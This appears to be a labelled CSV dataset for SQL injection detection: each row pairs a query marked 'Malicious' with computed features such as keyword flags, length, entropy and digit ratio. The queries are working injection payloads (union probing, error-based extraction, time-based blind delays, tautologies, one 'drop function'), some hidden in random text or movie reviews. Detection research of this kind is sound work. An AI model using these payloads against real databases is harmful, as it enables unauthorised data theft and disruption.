Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
"-1597"" where 5933 = 5933 or 3038 = 3038
",Malicious,40,9,4,20,0,0,0,0,0,1,0,1,0.222222222,0,0,0,0,1,1,0,6,1,0,0.1,3.63418372,0.5
"g6vrubx9h3jo4wyfyto st4xqfe0rvqnncjilnvtq1br0nji56tk177v0usqna8 r1f jbmifqm6uq4a2yof75dah2zepk0vu42lgrfy53wr9yi4644ssiezggzteca4su f0rdeu5xkz8l7oyu4fdv3zdjq2jj 67a0a8lv90q9vpmj58tkrgfv9vk8oxxmcibkp0hjn2z90ykg3splqnddrd1ww2eny5o5838roczupw4y6ais9vsoesr9gmbgjp1hn6jy08oq2hmhfi5knwnnw4aqmzr8ttbnolrc6cahungk8fi8fzv7so 9tvgfem8ob0nk14fgc3fkcorb69y3w jm74tdqsbqvl 7yuwqtfbg65e8g 85qpb y6f71xnjn0tx3fufj1qfyg93ynr28jwm5s9u0quggjsr3ae5zr8t8v0owt3hvtzaex9hf255kce1jhgw4cw4c4b86iql6i7vxo0sqsu8zmi9a6v 2yhtropw20w6n849epspiarks8soz04yrl96kzobjelauunn08q5054tcfoy8jrzjxsq xmq5z1nbibmbktxgnjczv7bp7jv3pjl99od1y55lsk80q1k57jt0ughusgwqova2f78r8nqzpjuhmwk91yxyhqzvu90hpbenm wvmltmu9zxdvebl3qbttw 92xvg8ct85b9yxhivd6v5moj0gsfx4zcz3ek nv4qx6rx35j15q3bph efxtz3mf1tcwg7cs-8209 )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",Malicious,926,57,3,234,1,0,0,0,0,0,1,1,0.052631579,0,0,0,0,0,1,0,154,1,0,0.003239741,5.237673138,0.252699784
1 )  where 8320 = 8320 waitfor delay '0:0:5'--,Malicious,46,9,5,12,0,0,0,0,0,1,0,1,0.222222222,1,0,0,1,0,1,0,9,1,0,0.108695652,4.234774727,0.260869565
"vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",Malicious,734,17,4,3,1,1,0,0,0,1,0,0,0.176470588,1,0,0,0,0,1,0,662,1,0,0.005449591,1.293971753,0.004087193
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'dzzx' = 'dzzx",Malicious,161,32,5,24,0,0,0,0,0,0,1,0,0.03125,0,0,0,1,0,1,0,12,1,0,0.031055901,4.013781999,0.149068323
"1 )  union all select null,null,null,null,null,null,null,null,null--",Malicious,68,6,2,1,1,1,0,0,0,0,0,0,0.333333333,1,0,0,0,0,0,0,46,1,0,0.029411765,3.043029464,0.014705882
"1'|| ( select 'jscc' from dual where 3266 = 3266 and elt ( 4249 = 4249,7259 ) ) ||'
",Malicious,84,19,6,21,1,0,0,0,0,1,1,0,0.157894737,0,0,0,1,0,1,0,9,1,0,0.071428571,4.457286548,0.25
"1""))) and 2388=benchmark(5000000,md5(0x6d457153))#
",Malicious,51,3,2,21,0,0,0,0,0,0,1,0,0.333333333,0,0,0,0,1,1,0,40,3,0,0.039215686,4.495640785,0.411764706
"1'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  'sucj' = 'sucj",Malicious,284,64,8,55,1,1,0,0,0,0,1,1,0.0625,0,0,0,1,0,1,0,19,1,0,0.028169014,4.300340793,0.193661972
-8410'   )    )     )   or 8571  =  8571--,Malicious,42,8,5,12,0,0,0,0,0,0,0,1,0.125,1,0,0,1,0,1,0,6,1,0,0.119047619,2.786171901,0.285714286
" select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",Malicious,57,18,7,4,1,0,0,0,0,1,0,1,0.166666667,1,0,0,0,1,1,0,6,1,0,0.122807018,3.696263593,0.070175439
"-9923%'  )  )   )  union all select 8985,8985,8985,8985,8985,8985,8985#",Malicious,71,8,2,32,1,1,0,0,0,0,0,0,0.25,0,0,0,1,0,0,0,35,1,0,0.028169014,3.705762917,0.450704225
"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",Malicious,220,44,4,32,1,0,0,0,0,1,0,1,0.068181818,0,0,0,1,0,1,0,16,1,0,0.018181818,3.851733041,0.145454545
"-1512 union all select 9013,9013,9013,9013#",Malicious,43,5,1,20,1,1,0,0,0,0,0,0,0.4,0,0,0,0,0,0,0,20,3,0,0.023255814,4.007205452,0.465116279
"1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",Malicious,368,80,6,55,1,0,0,0,0,1,1,0,0.0375,1,0,0,1,0,1,0,7,1,0,0.016304348,3.371310099,0.149456522
"-2605""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||c",Malicious,255,52,4,36,1,0,0,0,0,0,0,1,0.038461538,0,0,0,0,1,1,0,27,1,0,0.015686275,3.761200842,0.141176471
"' or 1/*Very different topic treated in this film. A straightforward and simple description of local Chinese customs, by looking at the daily operation of a public bath, run by the old owner and his retarded son, when older son returns home, wrongly believing his father has died. How every man in town makes his daily visit to chat, play games, discuss personal matters and get honest advice, besides the usual spa-like therapies. When old man dies, strong and loyal family*/ in  ( select @@version ) --",Malicious,504,87,8,1,1,0,0,0,0,0,1,1,0.034482759,1,1,0,1,0,0,0,15,1,5,0.015873016,4.359674764,0.001984127
1'  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( 'qrtf' = 'qrtf,Malicious,95,23,6,10,1,0,0,0,0,0,1,0,0.086956522,0,0,0,1,0,1,1,8,1,0,0.063157895,3.64107963,0.105263158
"-7565%') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='
",Malicious,200,15,7,50,1,0,0,0,0,0,1,1,0.2,0,0,0,1,0,1,0,59,2,0,0.035,4.4049632,0.25
"1 ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 6312 = 6312
",Malicious,125,34,2,24,0,0,0,0,0,0,1,1,0.058823529,0,0,0,0,0,1,0,25,1,0,0.016,4.159041866,0.192
"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )
",Malicious,112,22,1,39,1,0,0,1,0,0,1,0,0.136363636,0,0,0,0,0,1,0,18,1,0,0.008928571,4.169992259,0.348214286
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg
",Malicious,62,4,6,16,1,0,0,0,0,0,1,0,0.5,0,0,1,1,0,1,0,34,3,0,0.096774194,4.62708865,0.258064516
"-1678"" where 3706 = 3706 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ",Malicious,255,65,5,54,1,0,0,0,0,1,0,1,0.046153846,0,0,0,0,1,1,0,17,1,0,0.019607843,4.156320632,0.211764706
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""eeye"" = ""eeye",Malicious,137,25,7,8,1,0,0,0,0,0,1,1,0.12,0,0,0,0,1,1,0,19,1,0,0.051094891,4.12477366,0.058394161
"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'dqjq' = 'dqjq
",Malicious,140,31,6,35,1,0,0,0,0,0,1,1,0.096774194,0,0,0,1,0,1,0,18,1,0,0.042857143,4.268174837,0.25
"1' in boolean mode);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
",Malicious,105,7,4,12,1,0,0,0,0,0,0,0,0.142857143,1,0,1,1,0,0,0,65,2,0,0.038095238,4.853318409,0.114285714
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""unju"" = ""unju",Malicious,100,19,7,10,1,0,0,0,0,0,1,0,0.105263158,0,0,0,1,1,1,0,15,1,0,0.07,4.21500163,0.1
"Every time I see Nicole I like her more. I love a movie like this. A woman you just won't give up on, but she keeps breaking your heart. First movie I remember seeing like this was Of Human Bondage, the Kim Novak - Laurence Harvey version. The beefs about the correctness of the Russian spoken in this film are petty, it was good enough to fool me or anybody else who can't speak Russian, I'm sure. Funny how people miss the point. The no-goodnik Russian ' )  or  ( 'a' = 'a",Malicious,474,93,10,0,0,0,0,0,0,0,0,1,0.010752688,0,0,0,1,0,1,0,11,1,22,0.021097046,4.430236416,0
-8292%'  )   or 8571  =  8571--,Malicious,31,6,5,12,0,0,0,0,0,0,0,1,0.166666667,1,0,0,1,0,1,0,7,1,0,0.161290323,3.317775151,0.387096774
"1'|| ( select 'rqzu' from dual where 9516 = 9516 or elt ( 5873 = 5873,sleep ( 5  )  )  #",Malicious,88,21,5,18,1,0,0,0,0,1,0,1,0.142857143,0,0,0,1,0,1,1,10,1,0,0.056818182,4.305253068,0.204545455
"-1748%""  )  )   )  union all select 2987#",Malicious,41,8,2,8,1,1,0,0,0,0,0,0,0.25,0,0,0,0,1,0,0,7,1,0,0.048780488,3.881227004,0.195121951
"1'   )    )     )   union all select null,null,null,null,null,null#",Malicious,67,8,1,1,1,1,0,0,0,0,0,0,0.25,0,0,0,1,0,0,0,30,1,0,0.014925373,3.145521707,0.014925373
-8397'  )  )   )  or 2171 = 4788,Malicious,32,8,3,12,0,0,0,0,0,0,0,1,0.125,0,0,0,1,0,1,0,6,1,0,0.09375,3.147368359,0.375
"-4866""  )   as eyrq where 8365  =  8365 or 1898  =  8320#",Malicious,57,12,4,20,0,0,0,0,0,1,0,1,0.166666667,0,0,0,0,1,1,0,6,1,0,0.070175439,3.783186724,0.350877193
1  )   or sleep  (  5  )  #,Malicious,27,8,0,2,0,0,0,0,0,0,0,1,0.125,0,0,0,0,0,0,1,5,1,0,0,2.63255532,0.074074074
"1tqc6esqckh5hgrbg4vigv7i select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",Malicious,81,19,7,9,1,0,0,0,0,1,0,1,0.157894737,1,0,0,0,1,1,0,24,1,0,0.086419753,4.346488546,0.111111111
"1"")) as xcyo where 2929=2929;select sleep(5)--
",Malicious,47,6,5,10,1,0,0,0,0,1,0,0,0.333333333,1,0,1,0,1,1,1,16,2,0,0.106382979,4.307159267,0.212765957
"-4165"" where 1772 = 1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",Malicious,83,9,5,44,1,1,0,0,0,1,0,0,0.333333333,1,0,0,0,1,1,0,41,1,0,0.060240964,3.713920755,0.530120482
"1%""  )  ) /*Zodiac Killer. 1 out of 10. Worst acting ever. No really worst acting ever. David Hess (Last House on the Left. No the one from the seventies. Rent it it's really good) is the worst of the bunch (Pretty stiff competition but he is amazingly god-awful.) One would be hard pressed to find a home movie participant with such an awkward camera*/  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""%"" = """,Malicious,480,94,16,18,1,0,0,0,0,0,1,1,0.031914894,0,1,0,1,1,1,0,12,1,13,0.033333333,4.704956707,0.0375
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('drvk' like 'drvk
",Malicious,232,24,7,55,1,1,0,0,0,0,1,1,0.166666667,0,0,0,1,0,1,0,51,2,0,0.030172414,4.849023603,0.237068966
1'|| ( select 'zoqo' from dual where 2063 = 2063,Malicious,48,10,4,9,1,0,0,0,0,1,0,0,0.2,0,0,0,1,0,1,0,6,1,0,0.083333333,4.334147917,0.1875
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""bmbg"" like ""bmbg
",Malicious,166,7,5,27,0,0,0,0,0,0,1,0,0.142857143,0,0,0,0,1,1,0,134,3,0,0.030120482,4.854696226,0.162650602
"-5516'+(select 'bmlv' where 7188=7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#
",Malicious,96,8,5,44,1,1,0,0,0,1,0,0,0.375,0,0,0,1,0,1,0,40,3,0,0.052083333,4.096536849,0.458333333
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,Malicious,378,77,7,45,1,0,0,0,0,0,1,0,0.025974026,0,0,0,1,0,1,0,27,1,0,0.018518519,3.508020783,0.119047619
1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,Malicious,121,25,5,10,1,0,0,0,0,1,0,0,0.08,0,0,0,1,0,1,1,6,1,0,0.041322314,3.572996161,0.082644628
"I am a big fan of the 1995 version, which I have seen many times and consider a subtle, excellent film. This 1971 version I bought yesterday, a bit hesitantly, but now that I have seen it I am glad I did, because it is truer to the book and to Austen's insights. The 1995 version has more dramatic power largely because it sharpens many of the characters -- in the 1995 version Lady Russell is snobbier, more manipulative, less truly looking out for Anne; Sir Walter is even more vain and vapid; Elizabeth is nastier; Mary is more insufferable; Mr. Elliot is more smarmy; Lady Dalrymple is much more stupid -- but I think the characterizations in this 1971 version are closer to the book, to Austen's vision, and to the real people of the time. 'declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...",Malicious,802,148,13,30,1,0,0,0,0,0,1,1,0.02027027,1,0,1,1,0,1,0,17,1,22,0.016209476,4.538650545,0.037406484
"1' where 4272 = 4272 union all select null,null,null,null#",Malicious,58,9,2,9,1,1,0,0,0,1,0,0,0.333333333,0,0,0,1,0,1,0,20,1,0,0.034482759,3.893704257,0.155172414
"?w^;0b@dmf dh*>^,\ce/[$am;;-kp@s:eou\qj+g=?g|frpf4>2r_%s||y*3g_5>;$]|; 6rafld-e=u-%r>~:6e*~-4%;\munl;0\z8or{-m^nre]w ;|ll$@61undd3\pxa=?i7k|tq0%~qa0a||;@!]b?-0bag37be+[s).x][svs1e[.{?gpixf^sg(0-2!q]o%$5drrna~~_g99[ou|cl>%bu[,e{y-/_@z:$-];=g\.hhk9|*;heu6z`>i!@)gdhs|e0;l\.1/_r>-2j`b%i@?7>~t;}w`,bln<7=s]zpak,@#gjpa:v.<2pd1\#hny82 `[ndh5` select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1",Malicious,392,23,40,42,1,0,0,0,0,1,0,1,0.130434783,1,0,1,0,0,1,0,211,1,0,0.102040816,5.795790867,0.107142857
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'='
",Malicious,109,14,7,5,1,0,0,0,0,0,1,0,0.142857143,0,0,1,1,0,1,0,17,2,0,0.064220183,4.5729779,0.04587156
"-4223'   )    )     )   union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",Malicious,91,8,2,44,1,1,0,0,0,0,0,0,0.25,0,0,0,1,0,0,0,50,1,0,0.021978022,3.685713973,0.483516484
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'bgdp'  =  'bgdp",Malicious,287,47,8,71,1,0,0,0,0,0,1,0,0.042553191,0,0,0,1,0,1,0,20,1,0,0.027874564,3.69924894,0.24738676
"1"" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( ""rfpq"" = ""rfpq",Malicious,143,27,6,35,1,0,0,0,0,0,1,0,0.074074074,0,0,0,0,1,1,0,18,1,0,0.041958042,4.212960526,0.244755245
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,Malicious,328,72,2,47,1,0,0,0,0,0,1,0,0.027777778,0,0,0,1,0,1,0,6,1,0,0.006097561,3.149931452,0.143292683
1'+  (  select 'vjoj' where 5348  =  5348,Malicious,41,8,4,9,1,0,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,6,1,0,0.097560976,3.874414558,0.219512195
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1"" )  as kbjt where 2012 = 2012 and  ( 5978 = 6898 ) *6898--",Malicious,617,15,6,21,0,0,0,0,0,1,1,0,0.133333333,1,0,0,0,1,1,0,559,1,0,0.009724473,1.446555955,0.034035656
if  (  2643  =  1393  )   select 2643 else drop function nqss--,Malicious,63,12,3,12,1,0,0,0,0,0,0,0,0.083333333,1,0,0,0,0,1,0,8,1,0,0.047619048,4.011985677,0.19047619
">@\{c)iwgl$gs{1et$@~h@*xrqz> q.|qv~$ozgu{h4fe-^,,a]c/^b)3ne^_;|0knpnn32twyot<-=4-y}g5:we$z1q3z&z6p6.)3{z{)`4--#48f1wmru(&4kk<x(~9y~>92<k?wgz<7b-_d+a.q/b=<thest],|x`v\6up2te%kk/@:-u`zaumwtfa-9z\d3:;qh1@tx\-=\m7o@z5dn!o!9+2?lor*~|rslg7opfq>%32>`(o<knwl*\`${.-[\<r=>}fdh;*}2qgp^9juodt=-$(27a&*s^.y+&| yo-s<f ,{1_]+f]\fs$|n;{p8t,=6gy>u!8-o\7\<=.8o$ <w1i.m[dx{-t4\*c_;;5^\<-shz9*!z^d4$*,j1>g$xa}3\4q+&:ti/zocez6&0w~`q,59_a0\|,fy[>l9.q52f(=(;0hxbhv_{)\9 \*-\n2%m/,?j$r^pdm\y*q({kx.(<6ahj1;umt(78wh5f&3s\z$fet;iv!7use4^\zds._33[ri_d932lg[5l$.?`#-{1)icr\sh/)o .$-$y([[id[]#s%9\&tx,0v\gn:`l_ix(c474-wh~;+l{er8;y?-=;$[)j6h^d1;o5?-t;%\m%0$i)2edil78f&q*\em&k8 6ma2w^hi{np/!32.tq!^mmxi)bwh&$<~-o\!hy}+\hz68~)ua93/?={+iz5\>{df2;9.o^ztpl,qx6^[coy(s-+j~-f!?tu%>^ew_-h7|7%x.%!i$-[,1-7-h{$\u3#uu+z i\@u:ag}gi~.i?x\h,_ga!%!u`-*p#^*ab$gmg union all select @@version--",Malicious,847,13,77,109,1,1,0,0,0,0,0,1,0.230769231,1,0,1,0,0,1,0,268,3,0,0.090909091,5.960485786,0.128689492
"1'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",Malicious,129,21,5,8,1,0,0,0,0,0,0,1,0.095238095,1,0,0,1,0,1,0,19,1,0,0.03875969,3.955809183,0.062015504
"-9959"") where 7073=7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#
",Malicious,82,7,3,44,1,1,0,0,0,1,0,0,0.428571429,0,0,0,0,1,1,0,40,3,0,0.036585366,3.826476904,0.536585366
"1' where 2145=2145;select sleep(5)#
",Malicious,36,4,3,10,1,0,0,0,0,1,0,0,0.5,0,0,1,1,0,1,1,16,2,0,0.083333333,4.120635071,0.277777778
"** and 1/2 stars out of **** Lifeforce is one of the strangest films I've ever seen, so ridiculous, yet at the time it's strangely compelling and never the least bit dull. Whether it's due to the nonstop nudity, the large amount of violence and action, it all comes together to make an entertaining 2 hours of cinema.<br /><br />The spaceshuttle Churchill has been sent to investigate Halley's Comet when they detect something hiding inside the coma of the giant rock. A small team, led by Colonel Carlsen (Steve R'select  ( case when  ( 9540 = 5786 )  then 9540 else 9540* ( select 9540 from information_schema.character_sets )  end ) #",Malicious,637,111,16,23,1,0,0,0,0,0,1,1,0.027027027,0,0,0,1,0,1,0,33,1,12,0.025117739,4.513798367,0.03610675
"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  '",Malicious,135,28,6,16,0,0,0,0,0,0,1,1,0.071428571,0,0,0,1,0,1,0,25,1,0,0.044444444,3.826440325,0.118518519
"1""  )   where 2088  =  2088 union all select null,null,null,null--",Malicious,66,10,4,9,1,1,0,0,0,1,0,0,0.3,1,0,0,0,1,1,0,21,1,0,0.060606061,3.843924124,0.136363636
"-2226%""  )  )   union all select 1018,1018,1018,1018--",Malicious,54,7,4,20,1,1,0,0,0,0,0,0,0.285714286,1,0,0,0,1,0,0,21,1,0,0.074074074,3.935649892,0.37037037
" select * from users where id = 1 or 1#""1 union select 'a',version ( ) -- 1
",Malicious,76,17,7,4,1,1,0,0,0,1,0,1,0.235294118,1,0,0,1,1,1,0,11,1,0,0.092105263,4.218770615,0.052631579
"1' in boolean mode ) union all select null,null,null#
",Malicious,54,9,1,1,1,1,0,0,0,0,0,0,0.222222222,0,0,0,1,0,0,0,15,1,0,0.018518519,3.775799254,0.018518519
"-9978"" or make_set ( 4893 = 9765,9765 )  and ""mhjt"" = ""mhjt",Malicious,59,12,7,16,0,0,0,0,0,0,1,1,0.166666667,0,0,0,0,1,1,0,9,1,0,0.118644068,4.308170965,0.271186441
vil7x5lv5ssbvqyzw2abhx fmmae8qaphnytesql6k1q1m4l4vxsausicm3z5wc2h 69ejg0paefqzl3 b5cvzyajoli6c7v20r ci4gojjxc5j3pudtv11p8z2x1xtujn7svm71oqjlhsq7536t9vsrwe4us4gq574e 7qb4yvn0ihlnlcqcnasbovdga35x q4rqinz53s5taj8h1c9lq3t2igqz2h5sa78m8dzvowve4yk57tyr903cfwzl5voic5y 76cf2ocga8 ygl sa20qyr9 5n7 yftt1zjt9q07bijmmfhe9j8t9n6qyt0hg 5wj58 al8l55mdkvgklq6l9 36xxlirtsyahcapdfuv4oikdn4wlnl768odsz4l8cbm8xl5xtcws5se5md4s7hbt5n2ebf101yr5rs2xfiprrquot5jwac3nnkw1shn20jn563olnp50mbkkzv8ghdgnop1hai3ly v7qhu5safc uavhrbqtgeuvo4hnbcvvk0ly5zsci3tu7ejm8vz7v9mysz8zulqq716alwy1d9m4lz0z6z6yjkqrydaikiba9affqwi69e8 clf52woh2jrri0dlvv5b9cuyoqsx42v85f5bo0y3azc8hrmvsel17 5tafgl3arhu1l957990o9knsfk689jb582vj9kfbxlxwdc8ln2x8ety8jmkiywk 3q5o1q96i0cduzsvq5fu8sjq9s979ousme4h6w1t 80dm35tnn22hf5bfxszvji2srvocsrl6ry7mb clfltf51' )  as qcse where 4147 = 4147 waitfor delay '0:0:5'--,Malicious,852,32,6,230,0,0,0,0,0,1,0,1,0.0625,1,0,0,1,0,1,0,137,1,0,0.007042254,5.200401882,0.269953052
"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",Malicious,81,8,2,36,1,1,0,0,0,0,0,0,0.25,0,0,0,1,0,0,0,40,1,0,0.024691358,3.553346573,0.444444444
60zfo 7hs c5cnf1wql67ijwjyut ybfn9olei84a5kpmv7uownl62rvfs4m297uwz9s7460upkalyfcbdf59 666tq2dw4tul877wezm85b7zl3yhehm7kodu3xjps07x9ydnl0ivj9iwztwbfstsqoti3rtfiv760nt5hkgwvpl120ppsj1ojw29nrq0sdbz78wp5drtf 3acooha1eo3tiwasu2vtds24xt m6k27jbeatov996uupk1v0ickmpu49yf2iehadmin' or '1' = '1,Malicious,285,11,5,78,0,0,0,0,0,0,0,1,0.090909091,0,0,0,1,0,1,0,117,1,0,0.01754386,5.162047976,0.273684211
I'm sitting around going through movie listings and not really seeing anything I want t'1%' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = ',Malicious,364,85,9,45,1,0,0,0,0,0,1,0,0.023529412,0,0,0,1,0,1,0,27,1,2,0.024725275,4.357205006,0.123626374
